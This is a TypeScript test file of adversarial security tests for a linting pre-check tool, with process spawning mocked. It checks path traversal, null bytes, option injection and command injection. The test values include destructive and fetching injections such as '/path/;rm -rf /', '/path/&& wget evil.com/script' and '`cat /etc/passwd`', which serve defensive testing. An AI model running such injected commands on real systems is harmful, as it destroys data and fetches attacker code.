/**
 * ADVERSARIAL SECURITY TESTS: pre-check-batch.ts CWD fix
 *
 * Tests security of workspaceDir/directory handling in runLintOnFiles:
 * - runLintOnFiles(linter, files, workspaceDir) builds binary path using
 *   path.join(workspaceDir, 'node_modules', '.bin', ...) and passes
 *   cwd: workspaceDir to the shared external-tool runner
 *
 * ATTACK VECTORS TESTED:
 * 1. workspaceDir with path traversal: ../../etc/passwd, ..\\..\\Windows\\System32
 * 2. workspaceDir with null bytes: "/valid\x00/evil"
 * 3. workspaceDir with shell metacharacters
 * 4. workspaceDir extremely long (10000+ chars)
 * 5. directory (execute param): empty string, whitespace only, non-string types
 * 6. File array with path traversal: ["../../etc/passwd"], ["../../../windows/system32/cmd.exe"]
 * 7. File array with shell metacharacters
 * 8. File array with null bytes
 * 9. File array with paths starting with - (option injection)
 * 10. Empty files array, null files, undefined files
 */

import { afterEach, beforeEach, describe, expect, it, spyOn } from 'bun:test';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import {
	type PreCheckBatchInput,
	runPreCheckBatch,
} from '../../../src/tools/pre-check-batch';

// Mock Bun.spawn to capture calls
let originalSpawn: typeof Bun.spawn;
let spawnCalls: Array<{
	cmd: string[];
	opts: { cwd?: string; stdout?: string; stderr?: string };
}> = [];

function createMockSpawn() {
	return (
		cmd: string[],
		opts: { cwd?: string; stdout?: string; stderr?: string },
	) => {
		spawnCalls.push({
			cmd,
			opts: opts as { cwd?: string; stdout?: string; stderr?: string },
		});

		const encoder = new TextEncoder();
		const stdoutReadable = new ReadableStream({
			start(controller) {
				controller.enqueue(encoder.encode(''));
				controller.close();
			},
		});
		const stderrReadable = new ReadableStream({
			start(controller) {
				controller.enqueue(encoder.encode(''));
				controller.close();
			},
		});

		return {
			stdout: stdoutReadable,
			stderr: stderrReadable,
			exited: Promise.resolve(0),
			exitCode: 0,
		} as unknown as ReturnType<typeof Bun.spawn>;
	};
}

// Helper to create temp test directories
function createTempDir(): string {
	return fs.realpathSync(
		fs.mkdtempSync(path.join(os.tmpdir(), 'pre-check-batch-adv-')),
	);
}

describe('ADVERSARIAL: workspaceDir path traversal', () => {
	let tempDir: string;
	let originalCwd: string;

	beforeEach(() => {
		originalCwd = process.cwd();
		tempDir = createTempDir();
		process.chdir(tempDir);
		originalSpawn = Bun.spawn;
		Bun.spawn = createMockSpawn();
		spawnCalls = [];

		// Create test file
		fs.writeFileSync(path.join(tempDir, 'test.ts'), 'export const x = 1;\n');
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
		fs.rmSync(tempDir, { recursive: true, force: true });
	});

	/**
	 * ATTACK VECTOR 1a: Unix path traversal ../../etc/passwd
	 * Attempt to escape workspace via ../
	 */
	it('REJECTS: workspaceDir with Unix path traversal ../../etc/passwd', async () => {
		const maliciousWorkspace = '../../etc/passwd';

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			maliciousWorkspace,
		);

		// Should fail validation - directory traversal detected
		expect(result.gates_passed).toBe(false);
		expect(result.lint.error).toContain('traversal');
	});

	/**
	 * ATTACK VECTOR 1b: Windows path traversal ..\\..\\Windows\\System32
	 * Attempt to escape workspace via Windows path separators
	 */
	it('REJECTS: workspaceDir with Windows path traversal ..\\\\..\\\\Windows\\\\System32', async () => {
		const maliciousWorkspace = '..\\..\\Windows\\System32';

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			maliciousWorkspace,
		);

		// Should fail validation - path traversal detected
		expect(result.gates_passed).toBe(false);
		expect(result.lint.error).toContain('traversal');
	});

	/**
	 * ATTACK VECTOR 1c: Mixed path traversal
	 */
	it('REJECTS: workspaceDir with mixed path traversal', async () => {
		const maliciousWorkspace = '../../../root/.ssh';

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			maliciousWorkspace,
		);

		// Should fail validation
		expect(result.gates_passed).toBe(false);
		expect(result.lint.error).toContain('traversal');
	});
});

describe('ADVERSARIAL: workspaceDir null byte injection', () => {
	let tempDir: string;
	let originalCwd: string;

	beforeEach(() => {
		originalCwd = process.cwd();
		tempDir = createTempDir();
		process.chdir(tempDir);
		originalSpawn = Bun.spawn;
		Bun.spawn = createMockSpawn();
		spawnCalls = [];
		fs.writeFileSync(path.join(tempDir, 'test.ts'), 'export const x = 1;\n');
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
		fs.rmSync(tempDir, { recursive: true, force: true });
	});

	/**
	 * ATTACK VECTOR 2: Null byte injection in workspaceDir
	 */
	it('REJECTS: workspaceDir with null byte /valid\\x00/evil', async () => {
		const maliciousWorkspace = '/valid\x00/evil';

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			maliciousWorkspace,
		);

		// Should fail validation
		expect(result.gates_passed).toBe(false);
	});

	/**
	 * ATTACK VECTOR 2b: Multiple null bytes
	 */
	it('REJECTS: workspaceDir with multiple null bytes', async () => {
		const maliciousWorkspace = '/path\x00/with\x00/nulls';

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			maliciousWorkspace,
		);

		// Should fail validation
		expect(result.gates_passed).toBe(false);
	});
});

describe('ADVERSARIAL: workspaceDir shell metacharacters', () => {
	let tempDir: string;
	let originalCwd: string;

	beforeEach(() => {
		originalCwd = process.cwd();
		tempDir = createTempDir();
		process.chdir(tempDir);
		originalSpawn = Bun.spawn;
		Bun.spawn = createMockSpawn();
		spawnCalls = [];
		fs.writeFileSync(path.join(tempDir, 'test.ts'), 'export const x = 1;\n');
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
		fs.rmSync(tempDir, { recursive: true, force: true });
	});

	/**
	 * ATTACK VECTOR 3a: Command substitution $(...)
	 */
	it('HANDLES: workspaceDir with command substitution $(rm -rf .)', async () => {
		const maliciousWorkspace = '/path/$(rm -rf .)';

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			maliciousWorkspace,
		);

		// Should handle gracefully - not crash
		expect(result).toBeDefined();
		// The path would resolve to a weird path, but should be handled
	});

	/**
	 * ATTACK VECTOR 3b: Backtick command injection
	 */
	it('HANDLES: workspaceDir with backtick injection', async () => {
		const maliciousWorkspace = '/path/`cat /etc/passwd`';

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			maliciousWorkspace,
		);

		expect(result).toBeDefined();
	});

	/**
	 * ATTACK VECTOR 3c: Pipe to shell
	 */
	it('HANDLES: workspaceDir with pipe to shell', async () => {
		const maliciousWorkspace = '/path/|bash -c "evil"';

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			maliciousWorkspace,
		);

		expect(result).toBeDefined();
	});

	/**
	 * ATTACK VECTOR 3d: Semicolon command chaining
	 */
	it('HANDLES: workspaceDir with semicolon command chaining', async () => {
		const maliciousWorkspace = '/path/;rm -rf /';

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			maliciousWorkspace,
		);

		expect(result).toBeDefined();
	});

	/**
	 * ATTACK VECTOR 3e: && command chaining
	 */
	it('HANDLES: workspaceDir with && command chaining', async () => {
		const maliciousWorkspace = '/path/&& wget evil.com/script';

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			maliciousWorkspace,
		);

		expect(result).toBeDefined();
	});
});

describe('ADVERSARIAL: workspaceDir extremely long paths', () => {
	let tempDir: string;
	let originalCwd: string;

	beforeEach(() => {
		originalCwd = process.cwd();
		tempDir = createTempDir();
		process.chdir(tempDir);
		originalSpawn = Bun.spawn;
		Bun.spawn = createMockSpawn();
		spawnCalls = [];
		fs.writeFileSync(path.join(tempDir, 'test.ts'), 'export const x = 1;\n');
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
		fs.rmSync(tempDir, { recursive: true, force: true });
	});

	/**
	 * ATTACK VECTOR 4: Extremely long path (10000+ chars)
	 * Note: The path validation catches this as path traversal because /valid/aaa...
	 * is an absolute path that resolves outside the workspace
	 */
	it('REJECTS: workspaceDir extremely long path (10000+ chars)', async () => {
		const longPath = '/valid/' + 'a'.repeat(10000);

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			longPath,
		);

		// Should fail validation - either path too long OR traversal detected
		expect(result.gates_passed).toBe(false);
		expect(result.lint.error).toMatch(/(long|traversal)/);
	});

	/**
	 * ATTACK VECTOR 4b: Very long path (50000+ chars)
	 */
	it('REJECTS: workspaceDir very long path (50000+ chars)', async () => {
		const longPath = '/path/' + 'x'.repeat(50000);

		const result = await runPreCheckBatch(
			{
				files: ['test.ts'],
				directory: tempDir,
			},
			longPath,
		);

		// Should fail validation
		expect(result.gates_passed).toBe(false);
	});
});

describe('ADVERSARIAL: directory parameter invalid types', () => {
	let originalCwd: string;

	beforeEach(() => {
		originalCwd = process.cwd();
		originalSpawn = Bun.spawn;
		Bun.spawn = createMockSpawn();
		spawnCalls = [];
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
	});

	/**
	 * ATTACK VECTOR 5a: Empty string directory
	 */
	it('REJECTS: directory empty string', async () => {
		const result = await runPreCheckBatch({
			files: ['test.ts'],
			directory: '',
		});

		expect(result.gates_passed).toBe(false);
		expect(result.lint.error).toContain('directory');
	});

	/**
	 * ATTACK VECTOR 5b: Whitespace-only directory
	 */
	it('REJECTS: directory whitespace only', async () => {
		const result = await runPreCheckBatch({
			files: ['test.ts'],
			directory: '   ',
		});

		// Should either reject or fail-closed
		expect(result.gates_passed).toBe(false);
	});

	/**
	 * ATTACK VECTOR 5c: null directory
	 */
	it('REJECTS: directory null value', async () => {
		const result = await runPreCheckBatch({
			files: ['test.ts'],
			directory: null as any,
		});

		expect(result.gates_passed).toBe(false);
	});

	/**
	 * ATTACK VECTOR 5d: undefined directory
	 */
	it('REJECTS: directory undefined value', async () => {
		const result = await runPreCheckBatch({
			files: ['test.ts'],
		} as any);

		expect(result.gates_passed).toBe(false);
	});

	/**
	 * ATTACK VECTOR 5e: number as directory
	 */
	it('REJECTS: directory as number', async () => {
		const result = await runPreCheckBatch({
			files: ['test.ts'],
			directory: 12345 as any,
		});

		expect(result.gates_passed).toBe(false);
	});

	/**
	 * ATTACK VECTOR 5f: object as directory
	 */
	it('REJECTS: directory as object', async () => {
		const result = await runPreCheckBatch({
			files: ['test.ts'],
			directory: { path: 'test' } as any,
		});

		expect(result.gates_passed).toBe(false);
	});

	/**
	 * ATTACK VECTOR 5g: array as directory
	 */
	it('REJECTS: directory as array', async () => {
		const result = await runPreCheckBatch({
			files: ['test.ts'],
			directory: ['/path'] as any,
		});

		expect(result.gates_passed).toBe(false);
	});
});

describe('ADVERSARIAL: file array path traversal', () => {
	let tempDir: string;
	let originalCwd: string;
	let consoleWarnSpy: any;

	beforeEach(() => {
		originalCwd = process.cwd();
		tempDir = createTempDir();
		process.chdir(tempDir);
		originalSpawn = Bun.spawn;
		Bun.spawn = createMockSpawn();
		spawnCalls = [];
		fs.writeFileSync(path.join(tempDir, 'test.ts'), 'export const x = 1;\n');
		consoleWarnSpy = spyOn(console, 'warn').mockImplementation(() => {});
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
		fs.rmSync(tempDir, { recursive: true, force: true });
		if (consoleWarnSpy) consoleWarnSpy.mockRestore();
	});

	/**
	 * ATTACK VECTOR 6a: File path traversal ../etc/passwd
	 */
	it('REJECTS: file array with ../etc/passwd traversal', async () => {
		const result = await runPreCheckBatch({
			files: ['../../etc/passwd'],
			directory: tempDir,
		});

		// Should fail-closed - no valid files after validation
		expect(result.gates_passed).toBe(false);
		expect(result.lint.error).toContain('No files provided');
	});

	/**
	 * ATTACK VECTOR 6b: Windows path traversal ..\\..\\windows\\system32\\cmd.exe
	 */
	it('REJECTS: file array with Windows path traversal', async () => {
		const result = await runPreCheckBatch({
			files: ['../../../windows/system32/cmd.exe'],
			directory: tempDir,
		});

		// Should fail-closed
		expect(result.gates_passed).toBe(false);
		expect(result.lint.error).toContain('No files provided');
	});

	/**
	 * ATTACK VECTOR 6c: Mixed traversal patterns
	 */
	it('REJECTS: file array with mixed traversal patterns', async () => {
		const result = await runPreCheckBatch({
			files: ['..././../escape.ts', '..\\..\\escape.ts'],
			directory: tempDir,
		});

		// Should fail-closed
		expect(result.gates_passed).toBe(false);
	});

	/**
	 * ATTACK VECTOR 6d: All files are traversal paths
	 */
	it('REJECTS: all files are traversal paths - fail closed', async () => {
		const result = await runPreCheckBatch({
			files: ['../bad1.ts', '../bad2.ts', '../../outside/bad3.ts'],
			directory: tempDir,
		});

		// Should fail-closed
		expect(result.gates_passed).toBe(false);
		expect(result.lint.error).toContain('No files provided');
	});
});

describe('ADVERSARIAL: file array shell metacharacters', () => {
	let tempDir: string;
	let originalCwd: string;
	let consoleWarnSpy: any;

	beforeEach(() => {
		originalCwd = process.cwd();
		tempDir = createTempDir();
		process.chdir(tempDir);
		originalSpawn = Bun.spawn;
		Bun.spawn = createMockSpawn();
		spawnCalls = [];
		fs.writeFileSync(path.join(tempDir, 'test.ts'), 'export const x = 1;\n');
		consoleWarnSpy = spyOn(console, 'warn').mockImplementation(() => {});
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
		fs.rmSync(tempDir, { recursive: true, force: true });
		if (consoleWarnSpy) consoleWarnSpy.mockRestore();
	});

	/**
	 * ATTACK VECTOR 7a: Command substitution in file path
	 */
	it('HANDLES: file array with command substitution', async () => {
		const result = await runPreCheckBatch({
			files: ['$(whoami).ts'],
			directory: tempDir,
		});

		// Should handle gracefully - the path would resolve to a weird path
		expect(result).toBeDefined();
	});

	/**
	 * ATTACK VECTOR 7b: Backtick in file path
	 */
	it('HANDLES: file array with backticks', async () => {
		const result = await runPreCheckBatch({
			files: ['`id`.ts'],
			directory: tempDir,
		});

		expect(result).toBeDefined();
	});

	/**
	 * ATTACK VECTOR 7c: Pipe in file path
	 */
	it('HANDLES: file array with pipe', async () => {
		const result = await runPreCheckBatch({
			files: ['file|cat.ts'],
			directory: tempDir,
		});

		expect(result).toBeDefined();
	});
});

describe('ADVERSARIAL: file array null bytes', () => {
	let tempDir: string;
	let originalCwd: string;
	let consoleWarnSpy: any;

	beforeEach(() => {
		originalCwd = process.cwd();
		tempDir = createTempDir();
		process.chdir(tempDir);
		originalSpawn = Bun.spawn;
		Bun.spawn = createMockSpawn();
		spawnCalls = [];
		fs.writeFileSync(path.join(tempDir, 'test.ts'), 'export const x = 1;\n');
		consoleWarnSpy = spyOn(console, 'warn').mockImplementation(() => {});
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
		fs.rmSync(tempDir, { recursive: true, force: true });
		if (consoleWarnSpy) consoleWarnSpy.mockRestore();
	});

	/**
	 * ATTACK VECTOR 8: Null byte in file path
	 */
	it('REJECTS: file array with null byte', async () => {
		const result = await runPreCheckBatch({
			files: ['test\x00.ts'],
			directory: tempDir,
		});

		// Should fail-closed - null byte in path
		expect(result.gates_passed).toBe(false);
	});
});

describe('ADVERSARIAL: file array option injection', () => {
	let tempDir: string;
	let originalCwd: string;
	let consoleWarnSpy: any;

	beforeEach(() => {
		originalCwd = process.cwd();
		tempDir = createTempDir();
		process.chdir(tempDir);
		originalSpawn = Bun.spawn;
		Bun.spawn = createMockSpawn();
		spawnCalls = [];
		fs.writeFileSync(path.join(tempDir, 'test.ts'), 'export const x = 1;\n');
		consoleWarnSpy = spyOn(console, 'warn').mockImplementation(() => {});
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
		fs.rmSync(tempDir, { recursive: true, force: true });
		if (consoleWarnSpy) consoleWarnSpy.mockRestore();
	});

	/**
	 * ATTACK VECTOR 9a: File path starting with -
	 */
	it('HANDLES: file array with path starting with - (option injection)', async () => {
		// Create a file that starts with dash
		fs.writeFileSync(path.join(tempDir, '-rf'), 'evil content');

		const result = await runPreCheckBatch({
			files: ['-rf'],
			directory: tempDir,
		});

		// Should handle - but since the file doesn't actually start with '-'
		// as option flag (it's in array), it might be passed to the tool
		// The important thing is it doesn't bypass security
		expect(result).toBeDefined();
		// May fail for other reasons but should not bypass
	});

	/**
	 * ATTACK VECTOR 9b: Double dash --
	 */
	it('HANDLES: file array with -- (end of options)', async () => {
		fs.writeFileSync(path.join(tempDir, '--'), 'evil content');

		const result = await runPreCheckBatch({
			files: ['--'],
			directory: tempDir,
		});

		expect(result).toBeDefined();
	});
});

describe('ADVERSARIAL: empty/null/undefined files array', () => {
	let tempDir: string;
	let originalCwd: string;

	beforeEach(() => {
		originalCwd = process.cwd();
		tempDir = createTempDir();
		process.chdir(tempDir);
		originalSpawn = Bun.spawn;
		Bun.spawn = createMockSpawn();
		spawnCalls = [];
		fs.writeFileSync(path.join(tempDir, 'test.ts'), 'export const x = 1;\n');
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
		fs.rmSync(tempDir, { recursive: true, force: true });
	});

	/**
	 * ATTACK VECTOR 10a: Empty files array
	 */
	it('REJECTS: empty files array [] - fail closed', async () => {
		const result = await runPreCheckBatch({
			files: [],
			directory: tempDir,
		});

		// SECURITY: Must fail-closed - no files to check
		expect(result.gates_passed).toBe(false);
		expect(result.lint.error).toContain('No files provided');
	});

	/**
	 * ATTACK VECTOR 10b: null files
	 */
	it('REJECTS: null files - fail closed', async () => {
		const result = await runPreCheckBatch({
			files: null,
			directory: tempDir,
		} as any);

		// SECURITY: Must fail-closed
		expect(result.gates_passed).toBe(false);
	});

	/**
	 * ATTACK VECTOR 10c: undefined files
	 */
	it('REJECTS: undefined files - fail closed', async () => {
		const result = await runPreCheckBatch({
			directory: tempDir,
		} as any);

		// SECURITY: Must fail-closed
		expect(result.gates_passed).toBe(false);
	});

	/**
	 * ATTACK VECTOR 10d: files is not an array (string)
	 */
	it('REJECTS: files as string (not array) - fail closed', async () => {
		const result = await runPreCheckBatch({
			files: 'test.ts',
			directory: tempDir,
		} as any);

		// SECURITY: Should not bypass - must be array
		expect(result.gates_passed).toBe(false);
	});
});
